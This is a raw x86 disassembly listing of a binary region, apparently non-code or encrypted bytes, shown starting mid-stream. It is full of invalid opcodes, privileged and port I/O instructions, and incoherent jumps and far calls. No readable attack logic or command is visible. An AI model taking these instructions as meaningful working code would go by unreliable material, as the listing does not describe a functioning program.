  401fae:	(bad)  
  401faf:	int3   
  401fb0:	push   ss
  401fb1:	fcom   QWORD PTR [ecx+0x26]
  401fb4:	jbe    0x401fb8
  401fb6:	jmp    0x402017
  401fb8:	jmp    0x402019
  401fba:	add    bh,ch
  401fbc:	call   0xa7548ee9
  401fc1:	cs dec edx
  401fc3:	inc    ebx
  401fc4:	cld    
  401fc5:	aaa    
  401fc6:	vmwrite ecx,DWORD PTR [esi-0x1ba0f2e9]
  401fcd:	push   DWORD PTR [edx+0x53274d1f]
  401fd3:	sbb    bh,BYTE PTR [edi-0x3b]
  401fd6:	add    eax,esi
  401fd8:	hlt    
  401fd9:	outs   dx,BYTE PTR ds:[esi]
  401fda:	(bad)  
  401fdb:	iret   
  401fdc:	push   0xffffff9c
  401fde:	add    al,0xff
  401fe0:	mov    dl,BYTE PTR [ebp+0x7aa886a2]
  401fe6:	fst    QWORD PTR [ecx-0x64fe0df6]
  401fec:	sub    eax,0xd2f838e3
  401ff1:	int    0xb7
  401ff3:	sbb    al,0xfb
  401ff5:	and    al,0x65
  401ff7:	jnp    0x401feb
  401ff9:	or     al,0xe9
  401ffb:	mov    bh,0x81
  401ffd:	xchg   ebx,eax
  401ffe:	call   0x46b9:0x5c5843d1
  402005:	or     eax,0xd37b11c1
  40200a:	push   edi
  40200b:	pusha  
  40200c:	mov    edi,0x2a0dce33
  402011:	adc    edi,0x10c29b12
  402017:	sbb    eax,ebp
  402019:	fdivp  st(5),st
  40201b:	bnd ja 0x401fc0
  40201e:	push   ecx
  40201f:	jns    0x40204f
  402021:	dec    esp
  402022:	data16 clc 
  402024:	ss jecxz 0x402067
  402027:	mov    eax,ebx
  402029:	or     BYTE PTR [ebx+0x269c2ab],bl
  40202f:	dec    edx
  402030:	cmp    al,0x4
  402032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402033:	retf   
  402034:	cmp    al,0xf3
  402036:	out    0xa,eax
  402038:	add    BYTE PTR [eax+esi*2+0xeea8ff7],0xec
  402040:	xchg   ebp,eax
  402041:	and    bh,ch
  402043:	in     al,dx
  402044:	loopne 0x402054
  402046:	aam    0x94
  402048:	mov    al,ds:0x137f8626
  40204d:	pop    ebx
  40204e:	inc    ecx
  40204f:	leave  
  402050:	mov    ds:0x16870fcd,eax
  402055:	sbb    bh,BYTE PTR [eax+0x5a]
  402058:	push   ss
  402059:	add    esi,DWORD PTR [edi]
  40205b:	jne    0x40200f
  40205d:	(bad)  
  40205e:	sbb    BYTE PTR [ecx],bh
  402060:	dec    eax
  402061:	push   edx
  402062:	test   al,0x90
  402064:	nop
  402065:	pop    es
  402066:	or     eax,0x52547bca
  40206b:	and    eax,0x382d1b78
  402070:	fmul   QWORD PTR [esi]
  402072:	cmp    DWORD PTR [ecx+0x4e],ecx
  402075:	inc    ecx
  402076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402077:	retf   0xacdc
  40207a:	jmp    0xa3fd7947
  40207f:	push   esi
  402080:	mov    edx,0xf305560c
  402085:	inc    ebx
  402086:	out    0x26,al
  402088:	nop
  402089:	retf   0xa5e7
  40208c:	test   al,al
  40208e:	retf   0x7c4e
  402091:	push   edx
  402092:	jl     0x4020f0
  402094:	or     ebp,edi
  402096:	xorps  xmm7,XMMWORD PTR [edx+0x23]
  40209a:	mov    edi,0xacf11820
  40209f:	aas    
  4020a0:	xor    eax,0x8e2e8115
  4020a5:	or     bl,BYTE PTR [ecx+ecx*1-0x3]
  4020a9:	mov    DWORD PTR [eax-0x44],esi
  4020ac:	cmp    eax,0x4e02603
  4020b1:	lods   eax,DWORD PTR ds:[esi]
  4020b2:	push   eax
  4020b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020b4:	cmp    BYTE PTR [edi+0xc9d98f1],0x74
  4020bb:	scas   al,BYTE PTR es:[edi]
  4020bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020bd:	inc    ebx
  4020be:	pushf  
  4020bf:	mov    dh,0xdb
  4020c1:	setbe  BYTE PTR [ebx+0x114441a4]
  4020c8:	call   0xe87c:0x2ed464b0
  4020cf:	clc    
  4020d0:	ss inc ecx
  4020d2:	adc    DWORD PTR [edx+0xb140b68],edi
  4020d8:	sahf   
  4020d9:	es imul esp,edx,0x6e
  4020dd:	mov    al,ds:0xa5c3a0d3
  4020e2:	test   eax,0xefd5c3d
  4020e7:	dec    edi
  4020e8:	push   ecx
  4020e9:	mov    ds:0xfa664de0,al
  4020ee:	(bad)  
  4020ef:	outs   dx,BYTE PTR ds:[esi]
  4020f0:	and    esp,edx
  4020f2:	push   ss
  4020f3:	xchg   BYTE PTR [esi+0x24b85fbc],bl
  4020f9:	push   es
  4020fa:	xor    bl,dh
  4020fc:	mov    edi,0x1fb413bd
  402101:	sub    eax,0x36324577
  402106:	mov    dl,0xfb
  402108:	fistp  QWORD PTR [esi]
  40210a:	retf   0xf1de
  40210d:	nop
  40210e:	shr    DWORD PTR [esi-0x42],0x78
  402112:	lods   al,BYTE PTR ds:[esi]
  402113:	hlt    
  402114:	je     0x4020a6
  402116:	jo     0x4020b6
  402118:	mov    BYTE PTR [esi+edi*2-0x30ee4a36],bl
  40211f:	xor    al,0x8e
  402121:	fs push eax
  402123:	adc    eax,0xb74c3c95
  402128:	fs or  ebp,esi
  40212b:	inc    eax
  40212c:	and    BYTE PTR [edi-0x442e4e5b],bl
  402132:	stos   DWORD PTR es:[edi],eax
  402133:	mov    eax,ds:0x86c6e1f0
  402138:	addr16 int 0x5a
  40213b:	mov    WORD PTR [esi+0x42e34f05],?
  402141:	push   eax
  402142:	je     0x4020f2
  402144:	clc    
  402145:	loop   0x4021a7
  402147:	sub    edx,DWORD PTR [eax-0x47d30338]
  40214d:	or     BYTE PTR [edi+0x61],bh
  402150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402151:	lds    esp,FWORD PTR [ecx]
  402153:	icebp  
  402154:	lods   al,BYTE PTR fs:[esi]
  402156:	and    dl,cl
  402158:	and    edi,edi
  40215a:	mov    BYTE PTR [ebp+0x1360a626],al
  402160:	sbb    edx,DWORD PTR [esi+0x1d]
  402163:	adc    eax,0xdf2815fb
  402168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402169:	imul   esp,DWORD PTR [edi+0x7d9d0db1],0x455e65fc
  402173:	out    0x3f,eax
  402175:	push   ebx
  402176:	psubw  mm5,QWORD PTR [ebp-0x6d3d4b08]
  40217d:	enter  0x379,0xb0
  402181:	mov    edx,ds
  402183:	sub    BYTE PTR [edi-0x757e3225],bl
  402189:	add    DWORD PTR [eax+0x43],0x9dcdaeb3
  402190:	mov    esi,0xbae484f9
  402195:	outs   dx,BYTE PTR ds:[esi]
  402196:	shr    BYTE PTR [ecx],0x3
  402199:	je     0x40218a
  40219b:	sbb    BYTE PTR [esp+eiz*4],0xee
  40219f:	add    al,0xe9
  4021a1:	push   esi
  4021a2:	push   ebx
  4021a3:	loopne 0x4021a7
  4021a5:	pop    esp
  4021a6:	mov    ds:0x216be446,al
  4021ab:	jno    0x4021a0
  4021ad:	nop
  4021ae:	mov    ds:0x9532c512,eax
  4021b3:	sub    al,0xc1
  4021b5:	test   bh,0xd6
  4021b8:	inc    esp
  4021b9:	mov    ch,0xd
  4021bb:	scas   al,BYTE PTR es:[edi]
  4021bc:	scas   al,BYTE PTR es:[edi]
  4021bd:	push   eax
  4021be:	sbb    BYTE PTR [eax],ch
  4021c0:	cmp    ebp,DWORD PTR [ebx+0x38]
  4021c3:	jne    0x4021c7
  4021c5:	stc    
  4021c6:	push   es
  4021c7:	out    dx,al
  4021c8:	pop    ss
  4021c9:	sbb    eax,0xfb5ef9c3
  4021ce:	(bad)  
  4021d0:	ja     0x4021fa
  4021d2:	icebp  
  4021d3:	fstp   QWORD PTR [ebx-0x51]
  4021d6:	(bad)  
  4021d7:	enter  0xb5c5,0xf3
  4021db:	aaa    
  4021dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021dd:	dec    ebp
  4021de:	or     dh,ah
  4021e0:	pop    edi
  4021e1:	or     ebx,esi
  4021e3:	mov    ds:0xc826c29b,al
  4021e8:	lods   eax,DWORD PTR ds:[esi]
  4021e9:	mov    BYTE PTR [edi],al
  4021eb:	addr16 ret 0xa15c
  4021ef:	sbb    dh,BYTE PTR [esi]
  4021f1:	aaa    
  4021f2:	and    edi,ecx
  4021f4:	mov    edx,edi
  4021f6:	imul   edx,DWORD PTR [ecx-0x65],0x2b0c89b6
  4021fd:	ret    
  4021fe:	mov    cl,0xe8
  402200:	popa   
  402201:	test   BYTE PTR [esi],dl
  402203:	mov    bh,0x4e
  402205:	(bad)
  402209:	push   ebx
  40220a:	stos   BYTE PTR es:[edi],al
  40220b:	mul    DWORD PTR [eax]
  40220d:	jb     0x402229
  40220f:	test   al,0x55
  402211:	mov    esi,0x5afe4a9
  402216:	repz fdivr QWORD PTR [eax-0x2a078aed]
  40221d:	repnz neg BYTE PTR [eax+0x49]
  402221:	into   
  402222:	loop   0x40223c
  402224:	inc    edi
  402225:	xor    al,0xff
  402227:	jmp    0x402207
  402229:	lea    esi,[ebp+0x74737682]
  40222f:	push   esi
  402230:	scas   al,BYTE PTR es:[edi]
  402231:	sbb    al,ch
  402233:	imul   edx,DWORD PTR fs:[esi],0x54375828
  40223a:	mov    ds:0xce2eb589,eax
  40223f:	std    
  402240:	je     0x40228d
  402242:	mov    dl,0x5c
  402244:	cld    
  402245:	xor    al,0xc3
  402247:	inc    eax
  402248:	jl     0x4022a8
  40224a:	lahf   
  40224b:	scas   al,BYTE PTR es:[edi]
  40224c:	push   ds
  40224d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40224e:	adc    al,0x90
  402250:	dec    ecx
  402251:	div    DWORD PTR [ecx-0x3cbfffe8]
  402257:	add    ah,BYTE PTR [esp]
  40225a:	jb     0x40228a
  40225c:	cld    
  40225d:	dec    esi
  40225e:	inc    eax
  40225f:	and    cl,BYTE PTR [edi]
  402261:	fwait
  402262:	loope  0x40220b
  402264:	sbb    al,BYTE PTR [ecx-0x80]
  402267:	xchg   DWORD PTR [esi+esi*4-0x637ca548],eax
  40226e:	jle    0x40229b
  402270:	outs   dx,DWORD PTR ds:[esi]
  402271:	push   0x1b
  402273:	out    0x6b,al
  402275:	repz in eax,0x25
  402278:	or     edi,ebx
  40227a:	add    DWORD PTR [esi-0x4750af0e],0xffffff94
  402281:	stos   DWORD PTR es:[edi],eax
  402282:	jmp    0xd57b145b
  402287:	(bad)  
  402288:	fld    TBYTE PTR [eax+0x7e]
  40228b:	sbb    al,0xcb
  40228d:	pop    eax
  40228e:	inc    ecx
  40228f:	hlt    
  402290:	dec    edi
  402291:	dec    edx
  402292:	mov    WORD PTR [eax-0x34],es
  402295:	xor    ecx,DWORD PTR [eax]
  402297:	repnz add al,0x2f
  40229a:	sbb    DWORD PTR [edx+ebx*4+0x6d45643d],0xffffff8f
  4022a2:	jbe    0x402305
  4022a4:	popa   
  4022a5:	sbb    ah,BYTE PTR [ecx+0x36]
  4022a8:	push   eax
  4022a9:	dec    esi
  4022aa:	frstor [esi+eiz*1+0x426492a8]
  4022b1:	bound  esi,QWORD PTR [ecx-0x9]
  4022b4:	dec    ebx
  4022b5:	call   0x6b980c91
  4022ba:	sbb    BYTE PTR [ebx],bl
  4022bc:	fist   DWORD PTR [edx-0x64]
  4022bf:	mov    al,BYTE PTR [edi]
  4022c1:	jge    0x4022aa
  4022c3:	(bad)  
  4022c4:	cwde   
  4022c5:	aam    0x9f
  4022c7:	add    eax,0x8da6c975
  4022cc:	inc    esp
  4022cd:	xlat   BYTE PTR ds:[ebx]
  4022ce:	add    dl,ch
  4022d0:	sbb    dl,BYTE PTR [edi-0x262ffe35]
  4022d6:	adc    al,0xc9
  4022d8:	fwait
  4022d9:	inc    ebx
  4022da:	les    esi,FWORD PTR [edi]
  4022dc:	jp     0x402329
  4022de:	enter  0xa16a,0x22
  4022e2:	pop    ebx
  4022e3:	cmc    
  4022e4:	mov    esp,0x1cd67f7b
  4022e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022ea:	mov    ebp,0xd83365f2
  4022ef:	jg     0x4022b5
  4022f1:	dec    ebp
  4022f2:	mov    cl,0xa8
  4022f4:	mov    edx,0x94c5a6f5
  4022f9:	add    al,0x61
  4022fb:	and    DWORD PTR [ecx-0x797c62d9],ebp
  402301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402302:	dec    esp
  402303:	aaa    
  402304:	scas   eax,DWORD PTR es:[edi]
  402305:	mov    ds:0x542e4102,eax
  40230a:	adc    DWORD PTR [eax+0x136933b9],eax
  402310:	mov    bh,0xc6
  402312:	xchg   ebx,eax
  402313:	xchg   DWORD PTR [esi+0x7879b6e1],edx
  402319:	js     0x402313
  40231b:	cmp    bh,BYTE PTR [edi-0x2d0cc43]
  402321:	(bad)  
  402323:	int    0x78
  402325:	stc    
  402326:	xchg   edx,eax
  402327:	cmp    ah,bl
  402329:	sub    ch,al
  40232b:	imul   ecx,DWORD PTR [eax+0x1c],0x76b3922c
  402332:	outs   dx,DWORD PTR ds:[esi]
  402333:	pushfw 
  402335:	sbb    esp,DWORD PTR [edi+0x717f5239]
  40233b:	scas   al,BYTE PTR es:[edi]
  40233c:	add    DWORD PTR es:[ecx+0x29],edx
  402340:	int    0xa9
  402342:	adc    bl,BYTE PTR [esi-0x31]
  402345:	and    ah,BYTE PTR [edx+0x19c32845]
  40234b:	std    
  40234c:	mov    ds:0xe1db575c,al
  402351:	pushf  
  402352:	in     al,dx
  402353:	mov    WORD PTR [edx-0x69205da8],?
  402359:	and    al,BYTE PTR [ebx-0x52513249]
  40235f:	or     eax,0x56905f20
  402364:	or     edi,DWORD PTR [edx+0x3e]
  402367:	addr16 (bad) 
  402369:	(bad)  [eax-0x5f375012]
  40236f:	shl    ch,0xc8
  402372:	jp     0x40233f
  402374:	loop   0x40238c
  402376:	mov    bh,0xcc
  402378:	clc    
  402379:	and    DWORD PTR [edi-0x1ccc6cff],ebp
  40237f:	add    ebx,eax
  402381:	adc    al,ah
  402383:	sub    cl,ch
  402385:	pop    esi
  402386:	pop    es
  402387:	mov    esp,0xd64f36da
  40238c:	pop    ebp
  40238d:	pop    ss
  40238e:	out    0x26,eax
  402390:	adc    eax,0x53129e4b
  402395:	(bad)  
  402396:	cdq    
  402397:	xchg   esi,eax
  402398:	in     al,0x21
  40239a:	pop    ds
  40239b:	retf   
  40239c:	jg     0x40236c
  40239e:	or     BYTE PTR [eax-0x15],al
  4023a1:	in     eax,0x8e
  4023a3:	push   edi
  4023a4:	sar    BYTE PTR [eax+ecx*8-0x4b],0x67
  4023a9:	sub    al,BYTE PTR [eax-0x30]
  4023ac:	shr    DWORD PTR [ebp+0xc8d7ead],cl
  4023b2:	xlat   BYTE PTR ds:[ebx]
  4023b3:	out    0x37,eax
  4023b5:	int    0xc7
  4023b7:	cmp    DWORD PTR [bp+di+0x6a5b],ebp
  4023bc:	xor    al,0x83
  4023be:	out    0xe5,eax
  4023c0:	dec    edi
  4023c1:	push   cs
  4023c2:	mov    eax,0x563a149d
  4023c7:	sbb    BYTE PTR [ecx],dh
  4023c9:	lea    edx,[ecx]
  4023cb:	mov    eax,0xb3ffb4e2
  4023d0:	mov    BYTE PTR [esi],cl
  4023d2:	je     0x40243f
  4023d4:	addr16 mov esp,0x98d02992
  4023da:	adc    eax,0xe83ca2f4
  4023df:	sbb    eax,0xc3a3dd36
  4023e4:	mov    ds:0x124be56a,al
  4023e9:	int    0x2f
  4023eb:	and    DWORD PTR [edi],ecx
  4023ed:	dec    edx
  4023ee:	int    0x91
  4023f0:	fld    DWORD PTR [esi-0x46]
  4023f3:	sbb    al,al
  4023f5:	(bad)  [esi+0x1a]
  4023f8:	adc    DWORD PTR [edx+ebp*4+0x686dea65],esp
  4023ff:	inc    eax
  402400:	mov    ds:0xfa8b804a,al
  402405:	sub    eax,DWORD PTR [esi]
  402407:	inc    edx
  402408:	mov    ecx,0x45a809a
  40240d:	dec    ebp
  40240e:	jmp    0x6ee8:0x473bddd6
  402415:	mov    DWORD PTR [edi-0x1a],esp
  402418:	jmp    0xcef3:0x870a1b16
  40241f:	add    ebx,DWORD PTR [ecx+0x6adadae9]
  402425:	push   es
  402426:	inc    eax
  402427:	scas   eax,DWORD PTR es:[edi]
  402428:	sbb    BYTE PTR [edi+0x6f],0x21
  40242c:	mov    dh,0x80
  40242e:	fisubr DWORD PTR [esi+edi*8+0x2]
  402432:	push   ss
  402433:	mov    dh,0x16
  402435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402436:	pop    ss
  402437:	packuswb mm4,QWORD PTR [eax+0x38814251]
  40243e:	(bad)  
  40243f:	mov    esi,0x90a13845
  402444:	mov    dl,BYTE PTR [edx+0x4]
  402447:	test   eax,0xa6ab1cff
  40244c:	adc    eax,0x1da97d3b
  402451:	sbb    cl,0x81
  402454:	sub    ebp,eax
  402456:	jb     0x4024cc
  402458:	dec    esp
  402459:	je     0x402499
  40245b:	push   ss
  40245c:	xchg   ebp,eax
  40245d:	lahf   
  40245e:	xor    esp,DWORD PTR [esi+0xe]
  402461:	ret    0xf9d0
  402464:	mov    ecx,fs
  402466:	arpl   WORD PTR [ebx+0x3a],sp
  402469:	sbb    DWORD PTR [esi-0x28dd5ab2],esi
  40246f:	jge    0x4024b7
  402471:	sub    ecx,edx
  402473:	scas   al,BYTE PTR es:[edi]
  402474:	popf   
  402475:	or     al,0x2f
  402477:	cmp    dh,BYTE PTR [ecx+0x2d]
  40247a:	les    eax,FWORD PTR [esi+eiz*2-0x12870a6a]
  402481:	test   eax,0xf9a9551
  402486:	mov    eax,0x93ab6bc1
  40248b:	bound  esp,QWORD PTR [esi+0x6ef8e756]
  402491:	mov    ebp,0x747ab9aa
  402496:	push   edx
  402497:	mov    ebp,0xf6170a63
  40249c:	push   esp
  40249d:	xchg   esp,eax
  40249e:	stos   BYTE PTR es:[edi],al
  40249f:	(bad)  
  4024a0:	mov    dl,0xd4
  4024a2:	in     eax,dx
  4024a3:	sbb    BYTE PTR [ecx+eiz*8+0x2],0x16
  4024a8:	mov    ah,0xd7
  4024aa:	jnp    0x4024fa
  4024ac:	aas    
  4024ad:	pop    esi
  4024ae:	aas    
  4024af:	jl     0x40251b
  4024b1:	push   eax
  4024b2:	int3   
  4024b3:	lods   eax,DWORD PTR ds:[esi]
  4024b4:	pop    ss
  4024b5:	mov    ds:0x608f5c0a,al
  4024ba:	mov    eax,cr3
  4024bd:	aad    0xca
  4024bf:	push   ss
  4024c0:	push   eax
  4024c1:	cdq    
  4024c2:	hlt    
  4024c3:	push   esi
  4024c4:	ja     0x40251d
  4024c6:	xchg   edx,eax
  4024c7:	dec    esp
  4024c8:	cmc    
  4024c9:	add    BYTE PTR [esp+ebx*4-0x25ae1bb8],dh
  4024d0:	les    eax,FWORD PTR [esi+eax*1]
  4024d3:	(bad)  
  4024d5:	adc    esp,DWORD PTR [eax-0x31]
  4024d8:	sub    ah,BYTE PTR [ecx]
  4024da:	inc    ecx
  4024db:	fwait
  4024dc:	std    
  4024dd:	in     al,dx
  4024de:	les    ecx,FWORD PTR [eax+0x3e]
  4024e1:	mov    ?,edx
  4024e3:	cdq    
  4024e4:	xor    esp,ebp
  4024e6:	cli    
  4024e7:	adc    eax,0x7b5b936e
  4024ec:	mov    ebx,0x5bc04e5f
  4024f1:	das    
  4024f2:	in     eax,0x18
  4024f4:	(bad)  
  4024f5:	rcr    DWORD PTR [ebx-0x12],cl
  4024f8:	bound  esp,QWORD PTR [edi]
  4024fa:	pop    eax
  4024fb:	lods   al,BYTE PTR ds:[esi]
  4024fc:	js     0x40253d
  4024fe:	inc    esi
  4024ff:	dec    edx
  402500:	test   eax,0x8248ed23
  402505:	fbstp  TBYTE PTR [edi-0x4b]
  402508:	sbb    esi,DWORD PTR ds:0xa7866a8f
  40250e:	out    0x2c,al
  402510:	sub    eax,0xcf15b5b1
  402515:	shr    DWORD PTR [esi+0x3a],cl
  402518:	jne    0x402509
  40251a:	mov    eax,0xa8ab6fd5
  40251f:	retf   0x6af1
  402522:	cwde   
  402523:	or     BYTE PTR [ebx-0x40],bl
  402526:	ror    eax,1
  402528:	add    eax,0xce9aedf8
  40252d:	push   ds
  40252e:	out    dx,eax
  40252f:	bnd jne 0x4024bb
  402532:	clc    
  402533:	dec    DWORD PTR [edx-0x2dd016b1]
  402539:	sub    eax,0x71cef05e
  40253e:	jmp    0x7e32:0xdd94de8c
  402545:	sar    BYTE PTR [esi],cl
  402547:	sub    DWORD PTR [eax-0x4303d6d6],eax
  40254d:	imul   esp,DWORD PTR [eax+esi*4+0x1f],0x50a64656
  402555:	loopne 0x402568
  402557:	dec    ebx
  402558:	sahf   
  402559:	dec    edx
  40255a:	adc    bh,bh
  40255c:	mov    DWORD PTR ds:0xc37353d5,ebp
  402562:	mov    eax,edi
  402564:	stos   DWORD PTR es:[edi],eax
  402565:	aaa    
  402566:	leave  
  402567:	ret    0x4def
  40256a:	sti    
  40256b:	(bad)  
  40256c:	dec    ebx
  40256d:	xor    eax,DWORD PTR [ebp+0x58]
  402570:	enter  0xd70c,0x24
  402574:	mov    dh,0xfa
  402576:	dec    ebx
  402577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402578:	pop    ebp
  402579:	adc    eax,0x90940719
  40257e:	cs dec edi
  402580:	mov    eax,0xec5b22b9
  402585:	pop    ss
  402586:	inc    ecx
  402587:	pop    eax
  402588:	fisttp DWORD PTR [esi+0x1af4238e]
  40258e:	ret    0xd70e
  402591:	or     al,0x2f
  402593:	pop    es
  402594:	bound  esp,QWORD PTR [edx+0x15bfe244]
  40259a:	or     ebp,DWORD PTR [ebx]
  40259c:	test   DWORD PTR [ebp-0x5],esp
  40259f:	add    BYTE PTR [edi],cl
  4025a1:	and    DWORD PTR [ecx+0x20],eax
  4025a4:	xchg   edi,eax
  4025a5:	pop    ss
  4025a6:	and    BYTE PTR [esi+0x26970a18],cl
  4025ac:	lock xor BYTE PTR [eax+0x7465d909],cl
  4025b3:	mov    esi,0x456233ed
  4025b8:	in     al,0xc7
  4025ba:	cmp    al,0xb2
  4025bc:	pop    es
  4025bd:	sti    
  4025be:	mov    ds:0x42877d8b,al
  4025c3:	inc    ebp
  4025c4:	xchg   dh,bh
  4025c6:	ret    
  4025c7:	dec    esp
  4025c8:	pop    eax
  4025c9:	jno    0x4025c8
  4025cb:	test   dh,bh
  4025cd:	imul   ebx,DWORD PTR [edx],0xb1a4aa16
  4025d3:	stc    
  4025d4:	(bad)  
  4025d7:	inc    ebp
  4025d8:	pop    esi
  4025d9:	loopne 0x4025d5
  4025db:	outs   dx,DWORD PTR ds:[esi]
  4025dc:	aam    0x58
  4025de:	pop    ebx
  4025df:	data16 js 0x402611
  4025e2:	ret    
  4025e3:	xchg   edi,eax
  4025e4:	bound  edx,QWORD PTR [ebp-0x4b36b503]
  4025ea:	push   cs
  4025eb:	sub    al,0x69
  4025ed:	xor    al,0x19
  4025ef:	cdq    
  4025f0:	pop    edi
  4025f1:	or     eax,0x5dcacd79
  4025f6:	add    bl,BYTE PTR [eax+0x7]
  4025f9:	cmp    al,al
  4025fb:	cld    
  4025fc:	stos   DWORD PTR es:[edi],eax
  4025fd:	add    al,0x56
  4025ff:	lds    edi,FWORD PTR [ebx-0x6d3416fa]
  402605:	mov    esi,DWORD PTR [edi+ebp*8+0x3ec09a09]
  40260c:	stos   DWORD PTR es:[edi],eax
  40260d:	or     eax,0xda1e2dbf
  402612:	add    BYTE PTR [eax-0x24060b50],bl
  402618:	cmp    eax,0x167ef92
  40261d:	loopne 0x402615
  40261f:	adc    al,0xa4
  402621:	ss cmp eax,0x95edae26
  402627:	not    DWORD PTR [ebx+esi*1]
  40262a:	imul   ecx,DWORD PTR [ecx],0x54
  40262d:	cmp    esi,DWORD PTR [ebx-0x4f]
  402630:	sbb    DWORD PTR [ebp+0x25dc9922],edx
  402636:	inc    eax
  402637:	xor    eax,0x52e52abd
  40263c:	ins    DWORD PTR es:[edi],dx
  40263d:	mov    edx,DWORD PTR [esi+ecx*4+0x15be139e]
  402644:	outs   dx,BYTE PTR ds:[esi]
  402645:	xchg   edi,eax
  402646:	ret    0x8fb8
  402649:	cdq    
  40264a:	mov    bh,0x59
  40264c:	jnp    0x4025f4
  40264e:	cmp    esi,ebp
  402650:	lahf   
  402651:	fwait
  402652:	(bad)  
  402653:	cs mov ebp,0xf14f06eb
  402659:	cs dec esp
  40265b:	pop    es
  40265c:	inc    eax
  40265d:	pop    eax
  40265e:	xchg   BYTE PTR [eax],bh
  402660:	les    edi,FWORD PTR [ebx+edx*2-0x52274d63]
  402667:	pop    ebx
  402668:	test   eax,0x5b9a0a62
  40266d:	mov    bh,0x98
  40266f:	mov    ch,0xe2
  402671:	fs js  0x402615
  402674:	sbb    edx,edx
  402676:	cmp    al,0x49
  402678:	jl     0x40267b
  40267a:	js     0x40267f
  40267c:	push   es
  40267d:	das    
  40267e:	mov    ebp,?
  402680:	das    
  402681:	push   ebx
  402682:	inc    edx
  402683:	xor    edx,DWORD PTR [esi]
  402685:	pop    ebp
  402686:	cmp    DWORD PTR [edx+0x6237f279],0xed8e8da3
  402690:	(bad)  
  402691:	dec    esi
  402692:	ss jge 0x4026a8
  402695:	clc    
  402696:	and    bl,0xf9
  402699:	repnz dec ebp
  40269b:	(bad)  
  40269c:	je     0x40266b
  40269e:	mov    edi,0x9b6b08e3
  4026a3:	adc    eax,0xc39d2c1c
  4026a8:	test   DWORD PTR [ebx+0x18e2269b],0xe0b84bcd
  4026b2:	push   0x63
  4026b4:	retf   0xa80
  4026b7:	clc    
  4026b8:	pop    ebp
  4026b9:	jge    0x4026da
  4026bb:	test   DWORD PTR [ecx-0x643bbd4d],eax
  4026c1:	push   ds
  4026c2:	mov    ebp,0x49b735c
  4026c7:	int3   
  4026c8:	sub    al,0xca
  4026ca:	pop    edx
  4026cb:	push   0x1f3fdebe
  4026d0:	add    DWORD PTR [ecx],edx
  4026d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026d3:	ret    0x54bb
  4026d6:	fs jae 0x4026be
  4026d9:	mov    ecx,0x8c910068
  4026de:	cmp    eax,0x7bb6248c
  4026e3:	aam    0xc3
  4026e5:	mov    bh,BYTE PTR [edx-0x8d75ac]
  4026eb:	int    0x9f
  4026ed:	out    dx,al
  4026ee:	call   0x23a4:0x60269e22
  4026f5:	pop    es
  4026f6:	mov    ebp,0xe9a62682
  4026fb:	(bad)
  4026fe:	dec    esp
  4026ff:	pop    eax
  402700:	jp     0x4026f9
  402702:	sbb    BYTE PTR [edi+0x742651cd],bh
  402708:	retf   
  402709:	xor    DWORD PTR [edx+0x35],0x43
  40270d:	sar    DWORD PTR [edx+esi*2+0x3e],cl
  402711:	sbb    esp,DWORD PTR [edx-0x54c2299f]
  402717:	push   0x14f19bac
  40271c:	inc    esp
  40271d:	adc    al,0xc6
  40271f:	sub    DWORD PTR [edi-0x69],edx
  402722:	and    DWORD PTR [edx-0x3e],0x3018b7ae
  402729:	dec    esp
  40272a:	dec    BYTE PTR [edx+0x4a]
  40272d:	call   0xb2c61d8d
  402732:	jmp    0x4026e2
  402734:	fidivr DWORD PTR [ebx]
  402736:	loopne 0x402723
  402738:	add    edx,DWORD PTR [eax-0xff90bc8]
  40273e:	jno    0x402745
  402740:	pusha  
  402741:	add    ebp,eax
  402743:	add    al,0xaa
  402745:	cmp    eax,0x504f918a
  40274a:	les    edi,FWORD PTR [ebp-0x6c]
  40274d:	push   ebp
  40274e:	pusha  
  40274f:	add    ah,BYTE PTR [edi-0x19]
  402752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402753:	mov    BYTE PTR [esi+0x5d],bh
  402756:	xor    ch,ch
  402758:	and    DWORD PTR [ebp+0x5dc98b86],ebx
  40275e:	ins    DWORD PTR es:[edi],dx
  40275f:	sub    dh,dh
  402761:	xlat   BYTE PTR ds:[ebx]
  402762:	dec    ecx
  402763:	cmp    DWORD PTR [edx+esi*1+0x1da67b49],0xf3226d2d
  40276e:	pop    ebp
  40276f:	sub    ch,BYTE PTR [eax-0x30]
  402772:	hlt    
  402773:	xchg   ebx,eax
  402774:	push   esi
  402775:	pop    esi
  402776:	mov    DWORD PTR [edi-0x148e1cc5],esi
  40277c:	fstp   st(6)
  40277e:	lods   al,BYTE PTR ds:[esi]
  40277f:	ins    DWORD PTR es:[edi],dx
  402780:	mov    bl,0x62
  402782:	inc    ebx
  402783:	lea    eax,[esi+0x55ee4003]
  402789:	int3   
  40278a:	xchg   DWORD PTR es:[ebx+ebp*1-0x7b7b5131],ecx
  402792:	mov    ecx,0x36f80c69
  402797:	aad    0x25
  402799:	loope  0x4027c9
  40279b:	and    ch,BYTE PTR [edi-0x28fad072]
  4027a1:	out    dx,eax
  4027a2:	dec    esi
  4027a3:	xchg   esp,eax
  4027a4:	inc    ebp
  4027a5:	out    dx,al
  4027a6:	ins    DWORD PTR es:[edi],dx
  4027a7:	mov    al,ds:0x67c37a22
  4027ac:	push   esp
  4027ad:	adc    ah,BYTE PTR ds:0xe83fb0b8
  4027b3:	out    dx,al
  4027b4:	mov    cl,0x4f
  4027b6:	add    al,0x7b
  4027b8:	out    dx,al
  4027b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027ba:	push   eax
  4027bb:	pop    edi
  4027bc:	mov    dl,BYTE PTR [esi+0x69]
  4027bf:	pop    ebx
  4027c0:	jnp    0x402787
  4027c2:	cdq    
  4027c3:	(bad)  [edx+0x69]
  4027c6:	mul    DWORD PTR [edx]
